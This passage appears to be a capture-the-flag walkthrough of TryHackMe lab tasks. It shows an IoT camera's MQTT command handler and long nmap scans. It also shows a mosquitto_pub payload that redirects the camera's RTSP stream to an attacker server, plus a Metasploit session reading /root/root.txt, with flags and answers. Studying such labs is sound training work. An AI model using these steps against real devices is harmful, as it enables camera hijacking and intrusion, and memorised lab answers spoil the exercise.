+        payload = payload.replace("{", "")
+        payload = payload.replace("}", "")
+        payload = payload.split(",")
+        CMD = 0
+        URL = 1
+        command_payload = payload[CMD]
+        url_payload = payload[URL]
+        print(command_payload)
+        print(url_payload)
+        target_cmd = "10"
+        CMD_NAME = 0
+        CMD_VALUE = 1
+        URL_NAME = 0
+        URL_VALUE = 1
+        command_payload = command_payload.split(":")
+        url_payload = url_payload.split(":", 1)
+        if command_payload[CMD_NAME].lower() == "cmd":
+            if command_payload[CMD_VALUE] == target_cmd:
+                print("Command value match")
+                if url_payload[URL_NAME].lower() == "url":
+                    print("RTSPS URL match:", url_payload[URL_VALUE])
+                    try:
+                        f = open("../src/url.txt", "x")
+                        f.write(url_payload[URL_VALUE])
+                        f.close()
+                    except:
+                        f = open("../src/url.txt", "w")
+                        f.write(url_payload[URL_VALUE])
+                        f.close()
+                        
+                    subprocess.call("../deploy/update.sh")
+
+    client.subscribe(topic)
+    client.on_message = on_message
+```
+_Web camera expected device behavior (click to read)_
+-   The expected format of the message is `{”CMD”:value,”URL”:"value"}`
+-   Note the format for quotes must match exactly, and double quotes must wrap the entire message.
+-   The CMD value to overwrite/redirect the RTSP URL is `10`
+-   The URL value should be the _eth0_ or _ens0_ interface address of the attacking machine hosting the RTSP server and an RTSP path of your choosing.
+-   `RTSP://xxx.xxx.xxx.xxx:8554/path`
+To get you started, we have provided steps for exploitation set up below,
+1.  Verify that `MACHINE_IP` is an MQTT endpoint and uses the expected port with _Nmap_.
+2.  Use `mosquitto_sub` to subscribe to the `device/init` topic to enumerate the device and obtain the device ID.
+3.  Start an RTSP server using [rtsp-simple-server](https://github.com/aler9/rtsp-simple-server)
+-   `docker run --rm -it --network=host aler9/rtsp-simple-server`
+-   Note the port number for _RTSP_; we will use this in the URL you send in your payload.
+4.  Use `mosquitto_pub` to publish your payload to the `device/<id>/cmd` topic.
+-   Recall that your URL must use the attackbox IP address or respective interface address if you are using the VPN and be in the format of `rtsp://xxx.xxx.xxx.xxx:8554/path`
+-   If the message was correctly interpreted and the RTSP stream was redirected the server should show a successful connection and may output warnings from dropped packets.
+5.  You can view what is being sent to the server by running VLC and opening the server path of the locally hosted RTSP server.
+-   `vlc rtsp://127.0.0.1:8554/path`
+If you see a stream in VLC, congratulations, you have verified a takeover of the web camera stream.
+Note the stream may take up to one minute to begin forwarding due to packet loss.
+Answer the questions below
+What port is Mosquitto running on?
+nmap -p- <Target IP> -vv --min-rate 1500
+```text
+┌──(kali㉿kali)-[~]
+└─$ rustscan -a 10.10.105.108 --ulimit 5500 -b 65535 -- -A
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Real hackers hack time ⌛
+
+[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5500.
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+Open 10.10.105.108:22
+Open 10.10.105.108:80
+Open 10.10.105.108:1883
+[~] Starting Script(s)
+[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+[~] Starting Nmap 7.93 ( https://nmap.org )
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Initiating Ping Scan
+Scanning 10.10.105.108 [2 ports]
+Completed Ping Scan (1 total hosts)
+Initiating Parallel DNS resolution of 1 host.
+Completed Parallel DNS resolution of 1 host.
+DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan
+Scanning 10.10.105.108 [3 ports]
+Discovered open port 80/tcp on 10.10.105.108
+Discovered open port 22/tcp on 10.10.105.108
+Discovered open port 1883/tcp on 10.10.105.108
+Completed Connect Scan (3 total ports)
+Initiating Service scan
+Scanning 3 services on 10.10.105.108
+Completed Service scan (3 services on 1 host)
+NSE: Script scanning 10.10.105.108.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Nmap scan report for 10.10.105.108
+Host is up, received syn-ack (0.20s latency).
+
+PORT     STATE SERVICE                 REASON  VERSION
+22/tcp   open  ssh                     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 40b7df4461777d4dde4e5776989035c5 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHTRLASVJtnDOqdtCBma00sjOyEtWa0lGkSrCmibXabsb3f6W0mHMHhfbC+U+ebcChTBiHlWWPCT/g71iJxPwAG+t/LWZlQosKHQsOQ0J2lsZRL1/mv/wyrMHM8ltetHXFRJJH+lhXj3MHWQSj9+uHYcH/zy98P7HSaRapDtRjDSfXyXcNZZcO2aa8jJQR9WLUqWENkuN3hoAoGHPl5HnldtRPD1QqIjQEDSA+jgEQfbUtSvgaolvfKhsOmuOkJs5yio1xOjZsnQqDl6AoncJNcORvcNse8lwNIJxt+L1ru9+x9BGA/WC6FZgvkYtAzgbsFm0mQVNbx2zdAqgSeD6FGwLMSQA6f4PqFX1vRoAG5kxwlWfnDY7xDzNGfTiyaEHkdXPXo6663k9iHEV7TZM0Wx/C5WAuC3mXCu/+lbAMaENBt/OCNl59/ekjRszlVruYcxtHyvGasZ9AzUAecycnTa2gfyJQhlO24q4UUeBFs/x3hC4Yx8pjFuONfkkTnu0=
+|   256 aa97c20c9e43ceec61efc4825c9aaa58 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfNC3d37RZLjSD4qoenjXLhn6jnQsxqpaYLyWqb3WIsSEHkNsCBgdpF/XMvOnNlVb0W2l2/M4DsglRZXX2fvAU=
+|   256 2ff60aad50e4ccb9306584de7cad4409 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEs7JqzHMLQl/sWb0uPbwgrp4zOdf2UOeYXoIEOLAJfQ
+80/tcp   open  http                    syn-ack WebSockify Python/3.8.10
+|_http-title: Error response
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 405 Method Not Allowed
+|     Server: WebSockify Python/3.8.10
+|     Date: Thu, 22 Dec 2022 17:08:23 GMT
+|     Connection: close
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 472
+|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+|     "http://www.w3.org/TR/html4/strict.dtd">
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+|     <title>Error response</title>
+|     </head>
+|     <body>
+|     <h1>Error response</h1>
+|     <p>Error code: 405</p>
+|     <p>Message: Method Not Allowed.</p>
+|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
+|     </body>
+|     </html>
+|   HTTPOptions: 
+|     HTTP/1.1 501 Unsupported method ('OPTIONS')
+|     Server: WebSockify Python/3.8.10
+|     Date: Thu, 22 Dec 2022 17:08:23 GMT
+|     Connection: close
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 500
+|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+|     "http://www.w3.org/TR/html4/strict.dtd">
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+|     <title>Error response</title>
+|     </head>
+|     <body>
+|     <h1>Error response</h1>
+|     <p>Error code: 501</p>
+|     <p>Message: Unsupported method ('OPTIONS').</p>
+|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
+|     </body>
+|_    </html>
+|_http-server-header: WebSockify Python/3.8.10
+1883/tcp open  mosquitto version 1.6.9 syn-ack
+| mqtt-subscribe: 
+|   Topics and their most recent payloads: 
+|     $SYS/broker/load/bytes/sent/15min: 161.27
+|     $SYS/broker/load/bytes/sent/1min: 1526.36
+|     $SYS/broker/retained messages/count: 44
+|     $SYS/broker/heap/maximum: 58616
+|     $SYS/broker/bytes/received: 1321
+|     $SYS/broker/load/messages/sent/15min: 5.33
+|     $SYS/broker/publish/messages/sent: 67
+|     $SYS/broker/load/sockets/1min: 1.56
+|     $SYS/broker/messages/stored: 41
+|     $SYS/broker/load/publish/sent/15min: 4.11
+|     $SYS/broker/clients/inactive: 0
+|     $SYS/broker/heap/current: 58136
+|     $SYS/broker/clients/connected: 5
+|     $SYS/broker/bytes/sent: 2620
+|     $SYS/broker/publish/bytes/sent: 799
+|     $SYS/broker/publish/bytes/received: 640
+|     device/init: GDW8BADN2KWFECRLK2F0
+|     $SYS/broker/load/publish/received/5min: 3.89
+|     $SYS/broker/subscriptions/count: 4
+|     $SYS/broker/load/connections/5min: 0.56
+|     $SYS/broker/load/messages/sent/5min: 13.45
+|     $SYS/broker/clients/active: 5
+|     $SYS/broker/store/messages/bytes: 182
+|     $SYS/broker/publish/messages/received: 32
+|     $SYS/broker/messages/sent: 89
+|     $SYS/broker/load/publish/received/15min: 1.79
+|     $SYS/broker/load/publish/sent/1min: 37.66
+|     $SYS/broker/load/sockets/5min: 0.85
+|     $SYS/broker/messages/received: 54
+|     $SYS/broker/load/messages/sent/1min: 42.42
+|     $SYS/broker/load/sockets/15min: 0.39
+|     $SYS/broker/clients/total: 4
+|     $SYS/broker/load/messages/received/5min: 6.57
+|     $SYS/broker/load/messages/received/15min: 3.01
+|     $SYS/broker/clients/maximum: 4
+|     $SYS/broker/load/bytes/received/15min: 73.58
+|     $SYS/broker/load/connections/1min: 1.18
+|     $SYS/broker/store/messages/count: 41
+|     $SYS/broker/load/publish/sent/5min: 10.76
+|     $SYS/broker/load/publish/received/1min: 5.68
+|     $SYS/broker/clients/disconnected: 0
+|     $SYS/broker/load/bytes/received/5min: 159.92
+|     $SYS/broker/version: mosquitto version 1.6.9
+|     $SYS/broker/uptime: 330 seconds
+|     $SYS/broker/load/messages/received/1min: 10.44
+|     $SYS/broker/load/bytes/received/1min: 255.82
+|     $SYS/broker/load/connections/15min: 0.27
+|_    $SYS/broker/load/bytes/sent/5min: 425.83
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.93%I=7%D=12/22%Time=63A48F07%P=x86_64-pc-linux-gnu%r(Get
+SF:Request,291,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x2
+SF:0WebSockify\x20Python/3\.8\.10\r\nDate:\x20Thu,\x2022\x20Dec\x202022\x2
+SF:017:08:23\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/html;
+SF:charset=utf-8\r\nContent-Length:\x20472\r\n\r\n<!DOCTYPE\x20HTML\x20PUB
+SF:LIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x
+SF:20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Con
+SF:tent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x
+SF:20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>
+SF:\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20
+SF:response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20405
+SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Method\x20Not\x20A
+SF:llowed\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20expla
+SF:nation:\x20405\x20-\x20Specified\x20method\x20is\x20invalid\x20for\x20t
+SF:his\x20resource\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPOptio
+SF:ns,2B9,"HTTP/1\.1\x20501\x20Unsupported\x20method\x20\('OPTIONS'\)\r\nS
+SF:erver:\x20WebSockify\x20Python/3\.8\.10\r\nDate:\x20Thu,\x2022\x20Dec\x
+SF:202022\x2017:08:23\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20t
+SF:ext/html;charset=utf-8\r\nContent-Length:\x20500\r\n\r\n<!DOCTYPE\x20HT
+SF:ML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\
+SF:x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-eq
+SF:uiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\
+SF:x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x
+SF:20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>
+SF:Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20cod
+SF:e:\x20501</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Unsupport
+SF:ed\x20method\x20\('OPTIONS'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p
+SF:>Error\x20code\x20explanation:\x20HTTPStatus\.NOT_IMPLEMENTED\x20-\x20S
+SF:erver\x20does\x20not\x20support\x20this\x20operation\.</p>\n\x20\x20\x2
+SF:0\x20</body>\n</html>\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 99.24 seconds
+```
+*1883*
+Is the _device/init_ topic enumerated by Nmap during a script scan of all ports? (y/n)
+nmap -sC -sV -p- <Target IP> -vv --min-rate 1500
+*y*
+What Mosquitto version is the device using?
+Found from the $SYS$/broker/version topic
+```text
+┌──(kali㉿kali)-[~]
+└─$ nmap -sC -sV -p- 10.10.105.108 -vv --min-rate 1500
+Starting Nmap 7.93 ( https://nmap.org )
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Initiating Ping Scan
+Scanning 10.10.105.108 [2 ports]
+Completed Ping Scan (1 total hosts)
+Initiating Parallel DNS resolution of 1 host.
+Completed Parallel DNS resolution of 1 host.
+Initiating Connect Scan
+Scanning 10.10.105.108 [65535 ports]
+Discovered open port 80/tcp on 10.10.105.108
+Discovered open port 22/tcp on 10.10.105.108
+Increasing send delay for 10.10.105.108 from 0 to 5 due to max_successful_tryno increase to 4
+Increasing send delay for 10.10.105.108 from 5 to 10 due to max_successful_tryno increase to 5
+Discovered open port 1883/tcp on 10.10.105.108
+Completed Connect Scan (65535 total ports)
+Initiating Service scan
+Scanning 3 services on 10.10.105.108
+Completed Service scan (3 services on 1 host)
+NSE: Script scanning 10.10.105.108.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Nmap scan report for 10.10.105.108
+Host is up, received syn-ack (0.20s latency).
+
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE SERVICE                 REASON  VERSION
+22/tcp   open  ssh                     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 40b7df4461777d4dde4e5776989035c5 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHTRLASVJtnDOqdtCBma00sjOyEtWa0lGkSrCmibXabsb3f6W0mHMHhfbC+U+ebcChTBiHlWWPCT/g71iJxPwAG+t/LWZlQosKHQsOQ0J2lsZRL1/mv/wyrMHM8ltetHXFRJJH+lhXj3MHWQSj9+uHYcH/zy98P7HSaRapDtRjDSfXyXcNZZcO2aa8jJQR9WLUqWENkuN3hoAoGHPl5HnldtRPD1QqIjQEDSA+jgEQfbUtSvgaolvfKhsOmuOkJs5yio1xOjZsnQqDl6AoncJNcORvcNse8lwNIJxt+L1ru9+x9BGA/WC6FZgvkYtAzgbsFm0mQVNbx2zdAqgSeD6FGwLMSQA6f4PqFX1vRoAG5kxwlWfnDY7xDzNGfTiyaEHkdXPXo6663k9iHEV7TZM0Wx/C5WAuC3mXCu/+lbAMaENBt/OCNl59/ekjRszlVruYcxtHyvGasZ9AzUAecycnTa2gfyJQhlO24q4UUeBFs/x3hC4Yx8pjFuONfkkTnu0=
+|   256 aa97c20c9e43ceec61efc4825c9aaa58 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfNC3d37RZLjSD4qoenjXLhn6jnQsxqpaYLyWqb3WIsSEHkNsCBgdpF/XMvOnNlVb0W2l2/M4DsglRZXX2fvAU=
+|   256 2ff60aad50e4ccb9306584de7cad4409 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEs7JqzHMLQl/sWb0uPbwgrp4zOdf2UOeYXoIEOLAJfQ
+80/tcp   open  http                    syn-ack WebSockify Python/3.8.10
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 405 Method Not Allowed
+|     Server: WebSockify Python/3.8.10
+|     Date: Thu, 22 Dec 2022 17:11:13 GMT
+|     Connection: close
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 472
+|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+|     "http://www.w3.org/TR/html4/strict.dtd">
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+|     <title>Error response</title>
+|     </head>
+|     <body>
+|     <h1>Error response</h1>
+|     <p>Error code: 405</p>
+|     <p>Message: Method Not Allowed.</p>
+|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
+|     </body>
+|     </html>
+|   HTTPOptions: 
+|     HTTP/1.1 501 Unsupported method ('OPTIONS')
+|     Server: WebSockify Python/3.8.10
+|     Date: Thu, 22 Dec 2022 17:11:13 GMT
+|     Connection: close
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 500
+|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+|     "http://www.w3.org/TR/html4/strict.dtd">
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+|     <title>Error response</title>
+|     </head>
+|     <body>
+|     <h1>Error response</h1>
+|     <p>Error code: 501</p>
+|     <p>Message: Unsupported method ('OPTIONS').</p>
+|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
+|     </body>
+|_    </html>
+|_http-title: Error response
+|_http-server-header: WebSockify Python/3.8.10
+1883/tcp open  mosquitto version 1.6.9 syn-ack
+| mqtt-subscribe: 
+|   Topics and their most recent payloads: 
+|     $SYS/broker/bytes/received: 1954
+|     $SYS/broker/publish/messages/sent: 131
+|     $SYS/broker/messages/sent: 163
+|     $SYS/broker/load/bytes/sent/15min: 275.27
+|     $SYS/broker/load/messages/sent/15min: 8.71
+|     $SYS/broker/load/messages/received/5min: 8.07
+|     $SYS/broker/load/connections/1min: 0.33
+|     $SYS/broker/load/sockets/5min: 0.78
+|     $SYS/broker/bytes/sent: 5090
+|     $SYS/broker/publish/bytes/received: 980
+|     $SYS/broker/version: mosquitto version 1.6.9
+|     $SYS/broker/load/messages/sent/1min: 15.29
+|     $SYS/broker/load/messages/received/15min: 4.21
+|     $SYS/broker/load/publish/received/5min: 4.85
+|     $SYS/broker/uptime: 506 seconds
+|     device/init: GDW8BADN2KWFECRLK2F0
+|     $SYS/broker/load/bytes/received/15min: 99.75
+|     $SYS/broker/load/publish/received/1min: 6.08
+|     $SYS/broker/load/bytes/sent/5min: 558.06
+|     $SYS/broker/load/publish/sent/5min: 14.34
+|     $SYS/broker/load/publish/received/15min: 2.52
+|     $SYS/broker/messages/received: 82
+|     $SYS/broker/store/messages/bytes: 197
+|     $SYS/broker/load/connections/5min: 0.47
+|     $SYS/broker/publish/bytes/sent: 1331
+|     $SYS/broker/load/messages/received/1min: 10.02
+|     $SYS/broker/load/sockets/1min: 0.50
+|     $SYS/broker/load/bytes/received/1min: 227.78
+|     $SYS/broker/load/bytes/sent/1min: 435.33
+|     $SYS/broker/load/publish/sent/1min: 11.42
+|     $SYS/broker/load/publish/sent/15min: 7.08
+|     $SYS/broker/publish/messages/received: 49
+|     $SYS/broker/load/bytes/received/5min: 189.22
+|_    $SYS/broker/load/messages/sent/5min: 17.44
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.93%I=7%D=12/22%Time=63A48FB1%P=x86_64-pc-linux-gnu%r(Get
+SF:Request,291,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x2
+SF:0WebSockify\x20Python/3\.8\.10\r\nDate:\x20Thu,\x2022\x20Dec\x202022\x2
+SF:017:11:13\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/html;
+SF:charset=utf-8\r\nContent-Length:\x20472\r\n\r\n<!DOCTYPE\x20HTML\x20PUB
+SF:LIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x
+SF:20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Con
+SF:tent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x
+SF:20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>
+SF:\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20
+SF:response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20405
+SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Method\x20Not\x20A
+SF:llowed\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20expla
+SF:nation:\x20405\x20-\x20Specified\x20method\x20is\x20invalid\x20for\x20t
+SF:his\x20resource\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPOptio
+SF:ns,2B9,"HTTP/1\.1\x20501\x20Unsupported\x20method\x20\('OPTIONS'\)\r\nS
+SF:erver:\x20WebSockify\x20Python/3\.8\.10\r\nDate:\x20Thu,\x2022\x20Dec\x
+SF:202022\x2017:11:13\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20t
+SF:ext/html;charset=utf-8\r\nContent-Length:\x20500\r\n\r\n<!DOCTYPE\x20HT
+SF:ML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\
+SF:x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-eq
+SF:uiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\
+SF:x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x
+SF:20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>
+SF:Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20cod
+SF:e:\x20501</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Unsupport
+SF:ed\x20method\x20\('OPTIONS'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p
+SF:>Error\x20code\x20explanation:\x20HTTPStatus\.NOT_IMPLEMENTED\x20-\x20S
+SF:erver\x20does\x20not\x20support\x20this\x20operation\.</p>\n\x20\x20\x2
+SF:0\x20</body>\n</html>\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 145.36 seconds
+```
+*1.6.9*
+What flag is obtained from viewing the RTSP stream?
+```text
+device/init: GDW8BADN2KWFECRLK2F0
+
+root@ip-10-10-73-43:~# sudo docker run --rm -it --network=host aler9/rtsp-simple-server
+ INF rtsp-simple-server v0.20.4
+ INF [RTSP] listener opened on :8554 (TCP), :8000 (UDP/RTP), :8001 (UDP/RTCP)
+ INF [RTMP] listener opened on :1935
+ INF [HLS] listener opened on :8888
+ INF [RTSP] [conn 10.10.105.108:45788] opened
+ INF [RTSP] [session 31e1f554] created by 10.10.105.108:45788
+ INF [RTSP] [session 31e1f554] is publishing to path 'witty', with UDP, 1 track (H264)
+ INF [RTSP] [conn 127.0.0.1:52296] opened
+ INF [RTSP] [session af21bd94] created by 127.0.0.1:52296
+ INF [RTSP] [session af21bd94] is reading from path 'witty', with UDP, 1 track (H264)
+ WAR [RTSP] [session 31e1f554] 25 RTP packet(s) lost
+
+root@ip-10-10-73-43:~# sudo mosquitto_pub -h 10.10.105.108 -t device/GDW8BADN2KWFECRLK2F0/cmd -m """{"cmd":"10","url":"rtsp://10.10.73.43:8554/witty"}"""
+
+root@ip-10-10-73-43:~# vlc rtsp://127.0.0.1:8554/witty
+VLC media player 3.0.8 Vetinari (revision 3.0.8-0-gf350b6b5a7)
+[00005561de22c020] vlcpulse audio output error: PulseAudio server connection failure: Connection refused
+[00005561de18f570] main libvlc: Running vlc with the default interface. Use 'cvlc' to use vlc without interface.
+Created new TCP socket 24 for connection
+MultiFramedRTPSource::doGetNextFrame1(): The total received frame size exceeds the client's buffer size (250000).  44649 bytes of trailing data will be dropped!
+[00007f309c00d200] main decoder error: buffer deadlock prevented
+Failed to open VDPAU backend libvdpau_nvidia.so: cannot open shared object file: No such file or directory
+QXcbConnection: XCB error: 3 (BadWindow), sequence: 1888, resource id: 16917279, major code: 40 (TranslateCoords), minor code: 0
+[h264 @ 0x7f30940116a0] co located POCs unavailable
+[h264 @ 0x7f3094021f20] co located POCs unavailable
+[h264 @ 0x7f309403e720] co located POCs unavailable
+[h264 @ 0x7f30940116a0] co located POCs unavailable
+[h264 @ 0x7f3094021f20] co located POCs unavailable
+[h264 @ 0x7f309403e720] co located POCs unavailable
+
+THM{UR_CAMERA_IS_MINE}
+```
+![[Pasted image 20221222124459.png]]
+If you want to learn more check out the [Command Injection](https://tryhackme.com/room/oscommandinjection) room or the [Vulnerability Research](https://tryhackme.com/module/vulnerability-research) module!
+### [Day 22] Attack Surface Reduction Threats are failing all around me
+﻿                        The Story
+Check out Simply Cyber's video walkthrough for Day 22 [here](https://www.youtube.com/watch?v=1i4-Qq6tM2Q)!
+McSkidy wants to improve the security posture of Santa's network by learning from the recent attempts to disrupt Christmas. As a first step, she plans to implement low-effort, high-value changes that improve the security posture significantly.
+
+## Privilege Escalation
+```shell-session
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i -1
+[*] Starting interaction with 3...
+
+mesg: ttyname failed: Inappropriate ioctl for device
+ls /root
+root.txt
+cat /root/root.txt
+THM{...}
+```
+Answer the questions below
+Deploy the attached VM, and wait a few minutes. What ports are open?
+```text
+┌──(kali㉿kali)-[~]
+└─$ nmap -T4 -A -Pn 10.10.117.214
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-18 21:42 EST
+Nmap scan report for 10.10.117.214
+Host is up (0.19s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+|_http-title: Curabitur aliquet, libero id suscipit semper
+|_http-server-header: Apache/2.4.54 (Debian)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.73 seconds
+```
+*80*
+What framework is the web application developed with?
+![[Pasted image 20221218222413.png]]
+![[Pasted image 20221218223947.png]]
+*laravel*
+What CVE is the application vulnerable to?
